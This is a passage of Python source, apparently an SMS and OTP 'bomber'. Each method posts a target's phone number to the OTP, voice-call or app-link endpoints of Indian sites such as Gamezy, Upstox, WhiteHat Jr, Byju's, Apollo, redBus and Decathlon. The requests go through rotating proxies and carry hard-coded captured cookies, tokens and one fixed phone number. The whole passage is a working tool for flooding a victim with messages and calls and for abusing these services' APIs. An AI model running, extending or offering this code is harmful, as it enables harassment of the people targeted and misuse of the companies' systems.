            'x-requested-with': "XMLHttpRequest"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def nnow(self):
        url = "https://api.nnnow.com/d/apiV2/otp/resendOtp/v1/flash"
        monumber = 7984430992
        payload = "{\"mobileNumber\":"f'"{monumber}"'",\"otpTemplateId\":\"5b4e2e49b70e040008ffbcbe\",\"sessionId\":\"62a01603ead555000c4bca6a\"}"
        headers = {
            'cookie': "sess_map=vvyfuxavqcycbtwyfraxtawdwarwzravbesfcabuaxtsrysvduadqdquavtvuxybytbbwzbyucqexbucyfuzqfruvbtsvcdsbrqzbfxdazttzbdqqttuaeqaxredfryavfwfbvetqsdbueqsvuqdebwcfqedddfv",
            'Accept-Language': "en-US,en;q=0.9",
            'Connection': "keep-alive",
            'Content-Type': "application/json",
            'DNT': "1",
            'Origin': "https://www.nnnow.com",
            'Referer': "https://www.nnnow.com/",
            'Sec-Fetch-Dest': "empty",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Site': "same-site",
            'User-Agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'accept': "application/json",
            'bbversion': "v2",
            'clientSessionId': "1662729304519",
            'correlationId': "932406e5-6454-4dca-8760-ddc0856e9626",
            'module': "odin",
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def gamezy(self):
        url = "https://www.gamezy.com/api/auth/getOTP"
        payload = "{\"verificationChannel\":\"2\",\"mobile\":"f'"{self.user_mobile}"'"}"
        headers = {
            'authority': "www.gamezy.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json;charset=UTF-8",
            'cookie': "_gcl_au=1.1.2117215327.1654659285; _ga=GA1.1.1702043227.1654659285; _ga_PZRQFL09FN=GS1.1.1654659285.1.0.1654659293.0; gk-session-id=edba0488-4f64-4812-98b6-fd917ce802ee; WZRK_G=351f48773905445389decdde47510e71; WZRK_S_884-ZZ9-R55Z=%7B%22p%22%3A1%2C%22s%22%3A1654659295%2C%22t%22%3A1654659294%7D",
            'dnt': "1",
            'origin': "https://www.gamezy.com",
            'referer': "https://www.gamezy.com/game/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def gamezzy(self):
        url = "https://www.gamezy.com/api/user/sendAppDownloadLinkV1"
        monumber = 7984430992
        payload = "{\"mobile\":"f'"{monumber}"'"}"
        headers = {
            'authority': "www.gamezy.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'cookie': "_gcl_au=1.1.2117215327.1654659285; _ga=GA1.1.1702043227.1654659285; gk-session-id=edba0488-4f64-4812-98b6-fd917ce802ee; WZRK_G=351f48773905445389decdde47510e71; WZRK_S_884-ZZ9-R55Z=%7B%22p%22%3A1%2C%22s%22%3A1654659295%2C%22t%22%3A1654659299%7D; _ga_PZRQFL09FN=GS1.1.1654659285.1.1.1654659392.0",
            'dnt': "1",
            'origin': "https://www.gamezy.com",
            'referer': "https://www.gamezy.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def upstocks(self):
        url = "https://service.upstox.com/login/open/v3/auth/1fa/otp/generate"

        querystring = {"requestId": "WPRO-b07825c9c2"}
        monumber = 7984430992
        payload = "{\"data\":{\"mobileNumber\":"f'"{monumber}"'"}}"
        headers = {
            'cookie': "_gcl_au=1.1.1498453583.1654659024; WZRK_G=524d0c9d0f464abd8677becdbcfef577; _ga=GA1.1.646571292.1654659025; WZRK_S_4W7-R7R-KR5Z=%7B%22p%22%3A1%2C%22s%22%3A1654659025%2C%22t%22%3A1654659025%7D; lead_phone_number=9090909091; _cfuvid=aDSwK6UkDVifGOdOgFmHyoT4IS0wQNQTZiHprSI31ZM-1654659036156-0-604800000; _ga_VFG6NNXYGT=GS1.1.1654659024.1.0.1654659035.0; _uetsid=555b0590e6db11ec802a9d8db14d525e; _uetvid=555b2fe0e6db11eca666d9c8f6b73347",
            'authority': "service.upstox.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'dnt': "1",
            'origin': "https://login.upstox.com",
            'referer': "https://login.upstox.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'x-device-details': "platform=WEB|osName=Android/6.0|osVersion=Edge/102.0.1245.33|appVersion=4.0.0|modelName=Edge|manufacturer=LG"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, params=querystring, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def whitehatjr(self):
        url = "https://api.whitehatjr.com/api/V1/otp/generate"

        querystring = {"deviceId": "4332e115-c772-4321-a79a-8930d1d34c53", "timezone": "Asia/Calcutta", "trackingCode": "trackingCode|AB-11164-V-A|AB-11194-V-B|AB-11169-V-B|AB-11140-V-A|AB-11159-V-A|AB-11137-V-A|AB-11167-V-A|AB-11182-V-A|AB-11186-V-A|AB-11150-V-B|AB-11192-V-A|AB-22-V-B|AB-11183-V-B|AB-29-V-B|AB-11142-V-A|AB-11188-V-B|AB-11151-V-B|AB-11200-V-A|AB-24-V-C|AB-11154-V-A|AB-11152-V-A|AB-11166-V-A|AB-11195-V-A|AB-26-V-B|AB-11136-V-A|AB-13-V-B|AB-11198-V-A|AB-11196-V-A|AB-18-V-A|AB-11193-V-B|AB-11184-V-A|AB-31-V-A|AB-11191-V-B|AB-11181-V-B|AB-11176-V-B|AB-34-V-A|AB-28-V-B|AB-11156-V-A|AB-15-V-A|AB-11163-V-A|AB-11204-V-A|AB-11201-V-B|AB-25-V-B|AB-11155-V-A|AB-11135-V-A|AB-11161-V-A|AB-21-V-C|AB-11202-V-A|AB-17-V-A|AB-37-V-A|AB-23-V-C|AB-11153-V-A|AB-11165-V-A|AB-11175-V-A|AB-12-V-A|AB-11160-V-B|AB-27-V-B", "regionId": "IN", "courseType": "ALL", "brandId": "whitehatjr", "timestamp": "1654659767130", "_vercel_no_cache": "1"}
        payload = "{\"dialCode\":\"+91\",\"mobile\":"f'"{self.user_mobile}"'"}"
        headers = {
            'authority': "api.whitehatjr.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json;charset=UTF-8",
            'cookie': "deviceId=4332e115-c772-4321-a79a-8930d1d34c53; URLParams=%7B%22gclid%22%3A%22CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE%22%2C%22utm_medium%22%3A%22138787040051%22%2C%22utm_term%22%3A%22580981415654%22%2C%22utm_content%22%3A%22Whitehat_Exact%22%2C%22utm_source%22%3A%22Google_IND_SearchB%22%2C%22utm_campaign%22%3A%22IND_SOK_ACQ_Whitehat_Search_Brand_Booked_Exact%22%7D; abTests=trackingCode%7CAB-11164-V-A%7CAB-11194-V-B%7CAB-11169-V-B%7CAB-11140-V-A%7CAB-11159-V-A%7CAB-11137-V-A%7CAB-11167-V-A%7CAB-11182-V-A%7CAB-11186-V-A%7CAB-11150-V-B%7CAB-11192-V-A%7CAB-22-V-B%7CAB-11183-V-B%7CAB-29-V-B%7CAB-11142-V-A%7CAB-11188-V-B%7CAB-11151-V-B%7CAB-11200-V-A%7CAB-24-V-C%7CAB-11154-V-A%7CAB-11152-V-A%7CAB-11166-V-A%7CAB-11195-V-A%7CAB-26-V-B%7CAB-11136-V-A%7CAB-13-V-B%7CAB-11198-V-A%7CAB-11196-V-A%7CAB-18-V-A%7CAB-11193-V-B%7CAB-11184-V-A%7CAB-31-V-A%7CAB-11191-V-B%7CAB-11181-V-B%7CAB-11176-V-B%7CAB-34-V-A%7CAB-28-V-B%7CAB-11156-V-A%7CAB-15-V-A%7CAB-11163-V-A%7CAB-11204-V-A%7CAB-11201-V-B%7CAB-25-V-B%7CAB-11155-V-A%7CAB-11135-V-A%7CAB-11161-V-A%7CAB-21-V-C%7CAB-11202-V-A%7CAB-17-V-A%7CAB-37-V-A%7CAB-23-V-C%7CAB-11153-V-A%7CAB-11165-V-A%7CAB-11175-V-A%7CAB-12-V-A%7CAB-11160-V-B%7CAB-27-V-B; AB_DATA_GENERATED=true; feGeneratedDeviceId=false; ajs_anonymous_id=%22ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2%22; _scid=17a15132-4df7-46e2-a07c-ceb35d48a5fd; _gcl_au=1.1.2049152166.1654659669; _gcl_aw=GCL.1654659670.CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE; _ga=GA1.1.272570046.1654659670; _ga_G1JDQQ3VRY=GS1.1.1654659669.1.0.1654659670.59; _uetsid=d62480a0e6dc11ecb8a4f136ceb600a8; _uetvid=18684ca0a7ff11eca3286f63df1f1e05; _hsu=hs.1654659670215.753036eabb; _hscl=; _tt_enable_cookie=1; _ttp=6a4a3a33-a9be-4c5e-8618-f24ad9ef2cd3; _sctr=1|1654626600000; voxusmediamanager_ignore=true; voxusmediamanager_ignoreot_full=true; voxusmediamanager_id=16546596738640.9900373382273613a8nb0r5rgy8; voxusmediamanager__ip=103.240.76.144; _dd_s=logs=1&id=1447bbf7-abbd-4413-9e1b-44c553ee7100&created=1654659664183&expire=1654660667012&rum=0",
            'dnt': "1",
            'origin': "https://code.whitehatjr.com",
            'referer': "https://code.whitehatjr.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'whjr-amplitude-sessionid': "0",
            'whjr-segment-anonymousid': "ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, params=querystring, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def whitehatjrcall(self):
        url = "https://api.whitehatjr.com/api/V1/otp/generate"

        querystring = {"deviceId": "4332e125-c772-4321-a79a-8930d1d34c53", "timezone": "Asia/Calcutta", "trackingCode": "trackingCode|AB-11164-V-A|AB-11194-V-B|AB-11169-V-B|AB-11140-V-A|AB-11159-V-A|AB-11137-V-A|AB-11167-V-A|AB-11182-V-A|AB-11186-V-A|AB-11150-V-B|AB-11192-V-A|AB-22-V-B|AB-11183-V-B|AB-29-V-B|AB-11142-V-A|AB-11188-V-B|AB-11151-V-B|AB-11200-V-A|AB-24-V-C|AB-11154-V-A|AB-11152-V-A|AB-11166-V-A|AB-11195-V-A|AB-26-V-B|AB-11136-V-A|AB-13-V-B|AB-11198-V-A|AB-11196-V-A|AB-18-V-A|AB-11193-V-B|AB-11184-V-A|AB-31-V-A|AB-11191-V-B|AB-11181-V-B|AB-11176-V-B|AB-34-V-A|AB-28-V-B|AB-11156-V-A|AB-15-V-A|AB-11163-V-A|AB-11204-V-A|AB-11201-V-B|AB-25-V-B|AB-11155-V-A|AB-11135-V-A|AB-11161-V-A|AB-21-V-C|AB-11202-V-A|AB-17-V-A|AB-37-V-A|AB-23-V-C|AB-11153-V-A|AB-11165-V-A|AB-11175-V-A|AB-12-V-A|AB-11160-V-B|AB-27-V-B", "regionId": "IN", "courseType": "ALL", "brandId": "whitehatjr", "timestamp": "1654659858746", "_vercel_no_cache": "1"}
        payload = "{\"dialCode\":\"+91\",\"mobile\":"f'"{self.user_mobile}"'",\"type\":\"voice\"}"
        headers = {
            'authority': "api.whitehatjr.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json;charset=UTF-8",
            'cookie': "deviceId=4332e115-c772-4321-a79a-8930d1d34c53; URLParams=%7B%22gclid%22%3A%22CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE%22%2C%22utm_medium%22%3A%22138787040051%22%2C%22utm_term%22%3A%22580981415654%22%2C%22utm_content%22%3A%22Whitehat_Exact%22%2C%22utm_source%22%3A%22Google_IND_SearchB%22%2C%22utm_campaign%22%3A%22IND_SOK_ACQ_Whitehat_Search_Brand_Booked_Exact%22%7D; abTests=trackingCode%7CAB-11164-V-A%7CAB-11194-V-B%7CAB-11169-V-B%7CAB-11140-V-A%7CAB-11159-V-A%7CAB-11137-V-A%7CAB-11167-V-A%7CAB-11182-V-A%7CAB-11186-V-A%7CAB-11150-V-B%7CAB-11192-V-A%7CAB-22-V-B%7CAB-11183-V-B%7CAB-29-V-B%7CAB-11142-V-A%7CAB-11188-V-B%7CAB-11151-V-B%7CAB-11200-V-A%7CAB-24-V-C%7CAB-11154-V-A%7CAB-11152-V-A%7CAB-11166-V-A%7CAB-11195-V-A%7CAB-26-V-B%7CAB-11136-V-A%7CAB-13-V-B%7CAB-11198-V-A%7CAB-11196-V-A%7CAB-18-V-A%7CAB-11193-V-B%7CAB-11184-V-A%7CAB-31-V-A%7CAB-11191-V-B%7CAB-11181-V-B%7CAB-11176-V-B%7CAB-34-V-A%7CAB-28-V-B%7CAB-11156-V-A%7CAB-15-V-A%7CAB-11163-V-A%7CAB-11204-V-A%7CAB-11201-V-B%7CAB-25-V-B%7CAB-11155-V-A%7CAB-11135-V-A%7CAB-11161-V-A%7CAB-21-V-C%7CAB-11202-V-A%7CAB-17-V-A%7CAB-37-V-A%7CAB-23-V-C%7CAB-11153-V-A%7CAB-11165-V-A%7CAB-11175-V-A%7CAB-12-V-A%7CAB-11160-V-B%7CAB-27-V-B; AB_DATA_GENERATED=true; feGeneratedDeviceId=false; ajs_anonymous_id=%22ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2%22; _scid=17a15132-4df7-46e2-a07c-ceb35d48a5fd; _gcl_au=1.1.2049152166.1654659669; _gcl_aw=GCL.1654659670.CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE; _ga=GA1.1.272570046.1654659670; _ga_G1JDQQ3VRY=GS1.1.1654659669.1.0.1654659670.59; _uetsid=d62480a0e6dc11ecb8a4f136ceb600a8; _uetvid=18684ca0a7ff11eca3286f63df1f1e05; _hsu=hs.1654659670215.753036eabb; _hscl=; _tt_enable_cookie=1; _ttp=6a4a3a33-a9be-4c5e-8618-f24ad9ef2cd3; _sctr=1|1654626600000; voxusmediamanager_ignore=true; voxusmediamanager_ignoreot_full=true; voxusmediamanager_id=16546596738640.9900373382273613a8nb0r5rgy8; voxusmediamanager__ip=103.240.76.144; _dd_s=logs=1&id=1447bbf7-abbd-4413-9e1b-44c553ee7100&created=1654659664183&expire=1654660758684&rum=0",
            'dnt': "1",
            'origin': "https://code.whitehatjr.com",
            'referer': "https://code.whitehatjr.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'whjr-amplitude-sessionid': "0",
            'whjr-segment-anonymousid': "ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def byjus(self):
        url = "https://mtnucleus.byjusweb.com/api/acs/v2/send-otp"
        monumber = 7984430992
        payload = "{\"phoneNumber\":"f'"{monumber}"'",\"page\":\"free-trial-classes\"}"
        headers = {
            'Referer': "https://byjus.com/",
            'Content-Type': "application/json",
            'sec-ch-ua-mobile': "?1",
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def playerzpot(self):
        url = "https://msapi.playerzpot.com/v5.8/OauthNew/startSignUp"
        payload = f"mobile_no={self.user_mobile}&game=1"
        headers = {
            'authority': "msapi.playerzpot.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'auth-key': "playerzpotrestapi",
            'authorization': "",
            'client-service': "mobile-client",
            'content-type': "application/x-www-form-urlencoded",
            'dnt': "1",
            'game-mode': "1",
            'id': "0",
            'origin': "https://fantasycricket.playerzpot.com",
            'platform': "1",
            'ppm-api-key': "",
            'referer': "https://fantasycricket.playerzpot.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def westside(self):
        url = "https://api.tatadigital.com/api/v2/sso/check-phone"
        payload = "{\"countryCode\":\"91\",\"phone\":"f'"{self.user_mobile}"'",\"sendOtp\":true}"
        headers = {
            'cookie': "ak_bmsc=F8D72AB97FB03B461E48AFC01621566A~000000000000000000000000000000~YAAQBNksMW9DRSSBAQAA2Px1QRCsLf%2FCI3HBiRDjygkfMFHELhZEcnYWbnKfeMQSRzlQnhNJTEpfowAfQP%2F3mU5gl5Qv8aM16aULOrb71CPxvA%2FaNBaqjO2SXZ4%2BI%2FCGRnzo7G2r8ZBIKxVt4QLMbmh43H60Qd8u9YBQ1f%2FPZdRBDuEwHQHnluhyxL0GQKVVb00mTjRSL8%2F0TOtNC%2Bofgw6jjj2QMem6GTgoTZCoxmlnpWZT7nXFKF3BaTwEUr1Vd2EMDkodfE5T6ScBB0uxstB%2FKFYv1DG8C06HNTfzgOT1qajvRqGFpU32N0XVNtyG1HEPT0j6y6tZiEAKqSQdPOAGPTYr5zSxq8s808IbjQdEz%2BoOeHbwpiEFh22bppnalONABHqK9BB1lngATj4D3g%3D%3D; bm_sv=FFFD86B1C8EDC6EBF2F1BBBD6E948007~YAAQBNksMbdJRSSBAQAA0892QRAE%2BJhtoZ29OfNtNfBMbO1OsPJ6VnV7SmrvFxz%2FaeTscxVXkhu9lAUUQP%2FarIyOGRPREdV9ngTJouw9h7tF98Gc6wwJPrETN%2BbXwb%2BYEExaXHGPPD1ANgXn9JYVZraeXpbNjAvoZEx5CK8QeO4Ht%2BMT1FTqu0FopMuHW3%2BRJ0i3ZJeqOiTExkX3GMou%2BWyAjvrhzYq1el0EW4K41dT6UE8FS0lkIIYminwiKeqqvSBrDIE%3D~1",
            'authority': "api.tatadigital.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'client_id': "WESTSIDE-WEB-APP",
            'content-type': "application/json",
            'dnt': "1",
            'origin': "https://www.westside.com",
            'referer': "https://www.westside.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "cross-site",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def appolo(self):
        url = "https://apiservices.askapollo.com/api/AskApolloWeb/SendOTPForVerificationv2"
        payload = "{\"lstEmails\":[],\"lstMobiles\":["f'"{self.user_mobile}"'"],\"skipCaptcha\":true,\"leadSource\":\"Angular-PhysicalAppointment-Login\"}"
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'Content-Type': "application/json",
            'Accept': "application/json, text/plain, */*",
            'xauthtoken': "AAWEBLIVE-29SUBFEIBP8CXGGJOJ7W",
            'Referer': "https://www.askapollo.com/",
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def khatabook(self):
        url = "https://api.khatabook.com/v1/auth/request-otp"
        payload = "{\"country_code\":\"+91\",\"phone\":"f'"{self.user_mobile}"'",\"app_signature\":\"Jc/Zu7qNqQ2\",\"enableUserPref\":false}"
        headers = {
            'Accept': "*/*",
            'Accept-Language': "en-US,en;q=0.9",
            'Connection': "keep-alive",
            'DNT': "1",
            'Origin': "https://web.khatabook.com",
            'Referer': "https://web.khatabook.com/",
            'Sec-Fetch-Dest': "empty",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Site': "same-site",
            'User-Agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'content-type': "application/json",
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def playrummy(self):
        url = "https://www.playrummy.com/updateData.php"
        payload = f"data=sms_download_link&mobile={self.user_mobile}&source=download-web"
        headers = {
            'authority': "www.playrummy.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'cookie': "PHPSESSID=j02f6s41cah2rcrg8dkrbdt4g2; client_sid=WEB-103.240.76.144-1654661365; _gcl_au=1.1.1352135722.1654661365; _ga_V5JSM6KL3N=GS1.1.1654661365.1.0.1654661365.60; _ga=GA1.1.701454313.1654661366",
            'dnt': "1",
            'origin': "https://www.playrummy.com",
            'referer': "https://www.playrummy.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'x-requested-with': "XMLHttpRequest"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def redbus(self):
        url = "https://m.redbus.in/api/getOtp"
        querystring = {"number": self.user_mobile, "cc": "91",
                       "whatsAppOpted": "false", "disableOtpFlow": "undefined"}

        payload = ""
        headers = {
            'cookie': "bm_mi=55F56430F94936E87F0DA8DC88A02E08~YAAQH18sMdyaYQWBAQAA7g+GQRADjqxmbjVRe3AUkcQgXe9BjTCkY7FAse2KB9871iFYU6/nYQL4yTHk4ZMuUyGz68CVmSbKwjlfPKzDxgTYXGZoAHmWo3zrCwUUBRHITqZHd1VmYQYK0qWxpphcRoHaomzIlxr3dOQuX4jmftyn9XGnWPWpaDDjI1+VqunG90prkOsi1XmNbK8+P57oHiwv+AwOhmWAJHArB6UcXVQp4TaizlSrhzxzUWhfO778qZLPfRTcWsOrtTMbtiCTBM47LetMul9XtU1Xmsa55HqNbrWO0t/hLw3urnz1~1; _gcl_au=1.1.635915280.1654661714; _ga=GA1.1.538343953.1654661715; ak_bmsc=A3E03A571BC5FC92C76657606D4BEEE7~000000000000000000000000000000~YAAQb4IsMf/mUxmBAQAA5VCGQRA4A05YVPvB25subA4y0jh8AWhefIAB3NTs2EVNAh3NS6of7eq9AYEHDnRNpZKpwrKD1KMUCmt/ia6dcTTLBTZ3OGJJQvE0Kjb+KieV5Qa5lyYJeHcWPcTtI9RuMqJC67wc0TbWAJ7q0fnUMRE4lqboi+3OcBJks+zfMWdVfioO7VOJBXqYVcBeujNHK7TM42rYCLJ3mwAy+AmaZOs9D+hOfEizqJVNX0HCcuFxU649EQmOLOXCEQVhcGx9+IQ+s8JCVtT90i2VPgGPVPJ5aTbnBJOXIkI4nl3Unc2QwZZocJV7eHOtw8MK5HbhUTxYynajvEeNUOJKUXpZWJRg93+bU6fS1G3UmKlfgBh/gN1NwValJT7RQIjv5+q8GnwZ6DB7VYdOmfr90vdAqbYOxc8EHVPcTZlcXl4Z7e85hISOboGcB/ToH0ECutKFT99yyfNXybJvOrSxC6k+/IBk8QbCT+ATUsh6i5+cSMdVAmfLDkcvcmuxyAmDMS1xKdA=; _ga_7H5CPBRKXZ=GS1.1.1654661714.1.1.1654661746.28; tvc_smc_bus=google / organic / (not set); tvc_session_alive_bus=1; _ga_SVPLT0D8E8=GS1.1.1654661747.1.0.1654661747.60; rbuuid=af3a33e0-e6e1-11ec-b5b2-a13bb9d94460; userSessionId=ID_rjhtlpj19; userSessionCookie=af3a33e1-e6e1-11ec-b5b2-a13bb9d94460; country_ISO=IN; mriClientId=42f6ebe8-c5b3-4f6a-8a2f-ccc7d1c3a3a3-2dsojceOTthIysKXJOUpJw%3D%3D; mriClientIdSetDate=Wed%20Jun%2008%202022%2004%3A15%3A52%20GMT%2B0000%20(Coordinated%20Universal%20Time); mriBrowserFPSet=true; mriSessionId=6446b735-b4bb-4e8d-b847-1a3cdcffb939-Kmh8aUn-uI11k8DILNV#8qSQpVE=; bm_sv=9E5A85B675E57E40AB2B29882F3E49D4~YAAQH18sMfScYQWBAQAACseGQRDuQcFCx69gP6P3h/1Ag5u1uNNd//ZiBYFzAuOSV9ii/iKM+jeLqBLKhJebH68JiIkOzYm/VAXH+qWG+9sttVVCoL8IlxVYkTgoVAk3GY9h+ViINYpVVjuA4K9c/wM3NMy+t/l/zjHILCM5SbQea1uqxp0kAR+ydgnIpUQDenYTamC5a25ChUobR1IWus40yMz1U0fzyusd0J45pw+AzIvxEhLMT7Z+HMlLYUpV~1",
            'authority': "m.redbus.in",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'dnt': "1",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'traceparent': "00-cd75923cc440989066e258a2c05178cf-98e70b8548ee305a-01",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
        }
        try:
            request = requests.request("GET", url, data=payload, headers=headers, params=querystring, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def decathon(self):
        url = "https://www.decathlon.in/api/login/sendotp"
        payload = "{\"param\":"f'"{self.user_mobile}"'",\"source\":1}"
        headers = {
            'authority': "www.decathlon.in",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json;charset=UTF-8", 'dnt': "1",
            'origin': "https://www.decathlon.in",
            'referer': "https://www.decathlon.in/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def khelplay(self):
        url = "https://www.khelplayrummy.com/component/weaver"

        querystring = {"task": "registration.otpBasedCommonAjaxFunction"}
        payload = f"control=GET_OTP&sMobileOrEmailOperation=MOBILE&sOperation=REGISTRATION&sUserName={self.user_mobile}&isAjax=true"
        headers = {
            'authority': "www.khelplayrummy.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'dnt': "1",
            'origin': "https://www.khelplayrummy.com",
            'referer': "https://www.khelplayrummy.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
